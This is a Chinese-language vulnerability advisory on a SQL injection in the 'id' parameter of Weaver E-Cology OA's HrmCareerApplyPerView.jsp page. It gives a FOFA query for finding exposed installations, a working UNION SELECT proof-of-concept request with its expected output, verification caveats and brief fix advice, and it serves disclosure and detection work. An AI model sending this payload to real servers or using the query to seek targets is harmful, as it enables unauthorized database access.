---
cve: ""
fofa: "app=\"泛微-协同办公OA\""
version: "未知"
source: "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/90103c248a2c52bb0a060d0ee95d5a67e4579c3d/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20HrmCareerApplyPerView.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
---

# 泛微OA HrmCareerApplyPerView.jsp SQL注入漏洞

## 漏洞描述

泛微 E-Cology 的招聘申请页面 `HrmCareerApplyPerView.jsp` 存在公开记录的 `id` 参数 SQL 注入。公开验证通过 UNION 查询返回固定字符串的摘要，影响为数据库查询结果可被注入输入改变。

## 影响范围与前提

产品：泛微 E-Cology；完整受影响版本、补丁范围与认证条件未知。以下语法为 SQL Server 专用函数。本文仅记录有具体公开请求的 PerView 页面，不外推到其他招聘页面。

## 公开验证资料

```http
GET /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7 HTTP/1.1
Host: oa.example.com
```

预期摘要为 `900150983cd24fb0d6963f7d28e17f72`（表示形式可能有 `0x` 前缀）。`db_name(1)` 表示数据库 ID 为 1 的名称，不是“当前数据库名”。应确认摘要出现在查询结果位置，并排除单纯请求反射；`master`、`TD` 或 HTTP 200 本身不能确认注入。ProjectDiscovery 的常量摘要模板也列于来源中。

## 修复建议

向厂商核对当前版本和对应安全更新；在修复前限制该接口的访问，并检查相关访问日志。

## 参考来源

- [公开资料 1](https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/90103c248a2c52bb0a060d0ee95d5a67e4579c3d/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20HrmCareerApplyPerView.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
- [公开资料 2](https://github.com/projectdiscovery/nuclei-templates/blob/8b9d065ccb0492d39f7680c908b3030a97ddfe1b/http/vulnerabilities/weaver/weaver-ecology-hrmcareer-sqli.yaml)
- [公开资料 3](https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/weaver/ecology%20HrmCareerApplyPerView-sql.yaml)

来源已于 2026-10-02 静态核对；本文未在目标环境执行请求，公开 PoC 不代表本地复现通过。
